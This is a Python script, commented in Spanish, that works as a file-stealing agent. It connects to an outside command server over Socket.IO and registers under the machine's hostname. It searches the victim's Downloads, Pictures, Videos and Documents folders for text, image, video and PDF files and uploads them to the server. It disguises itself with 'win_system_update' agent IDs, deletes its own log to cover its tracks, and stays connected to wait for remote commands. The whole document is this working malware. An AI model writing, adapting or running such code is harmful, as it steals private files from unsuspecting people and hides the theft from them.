import os
import time
import requests
import glob
import sys
import subprocess
import socketio # Import socketio
import socket # Import socket for hostname

# Configuración
SERVER_URL = "https://netrunner-pro.up.railway.app" 
UPLOAD_ENDPOINT = f"{SERVER_URL}/api/upload"

# Inicializar Socket.IO client
sio = socketio.Client()
AGENT_ID = socket.gethostname() # Use hostname as agentId for uniqueness

# --- Socket.IO Events ---
@sio.event
def connect():
    log(f"Socket.IO conectado al servidor. ID del Agente: {AGENT_ID}")
    sio.emit('register_agent', {'agentId': AGENT_ID}) # Register agent with the server

@sio.event
def disconnect():
    log("Socket.IO desconectado del servidor.")

@sio.event
def connect_error(data):
    log(f"Socket.IO error de conexión: {data}")

@sio.event
def open_workspace(data):
    log(f"Comando open_workspace recibido: {data}")
    if sys.platform == "win32":
        try:
            subprocess.Popen(['explorer', os.getcwd()], creationflags=subprocess.CREATE_NO_WINDOW)
            log("Opened current directory in File Explorer.")
        except Exception as e:
            log(f"Error opening current directory: {e}")
    else:
        log("Workspace auto-open not supported on this OS.")


def log(message):
    """Función de log corregida para evitar errores de sintaxis."""
    try:
        with open('sync_log.txt', 'a') as f:
            f.write(f'[{time.ctime()}] {message}\n')
    except:
        pass

def run_exfiltration():
    user_profile = os.environ.get('USERPROFILE', '')
    targets = [
        os.path.join(user_profile, 'Downloads'),
        os.path.join(user_profile, 'Pictures'),
        os.path.join(user_profile, 'Videos'),
        os.path.join(user_profile, 'Documents')
    ]
    
    extensions = ['*.txt', '*.jpg', '*.png', '*.mp4', '*.pdf']
    
    for folder in targets:
        if not os.path.exists(folder):
            continue
        
        for ext in extensions:
            for file_path in glob.glob(os.path.join(folder, ext)):
                try:
                    filename = os.path.basename(file_path)
                    
                    # 1. Verificar duplicados
                    check = requests.get(f"{SERVER_URL}/api/check-file", params={
                        'agentId': socket.gethostname() if 'socket' in globals() else 'win_update',
                        'filename': filename
                    }, timeout=5)
                    
                    if check.status_code == 200 and check.json().get('exists'):
                        continue 

                    # 2. Validar tamaño (Límite 50MB)
                    if os.path.getsize(file_path) > 50 * 1024 * 1024:
                        continue
                    
                    # 3. Subida
                    with open(file_path, 'rb') as f:
                        requests.post(UPLOAD_ENDPOINT, 
                                    files={'file': (filename, f.read())}, 
                                    data={'agentId': 'win_system_update'}, 
                                    timeout=15)
                except:
                    continue

    # Limpieza de log antes de salir
    if os.path.exists('sync_log.txt'):
        try: os.remove('sync_log.txt')
        except: pass

if __name__ == "__main__":
    try:
        sio.connect(SERVER_URL)
        log(f"Agente Python conectado a {SERVER_URL}")
    except Exception as e:
        log(f"Fallo al conectar el agente Python al servidor: {e}")
        sys.exit(1) # Exit if connection fails
        
    run_exfiltration() # Run exfiltration before waiting for commands

    sio.wait() # Keep the Socket.IO connection alive

    sys.exit(0)
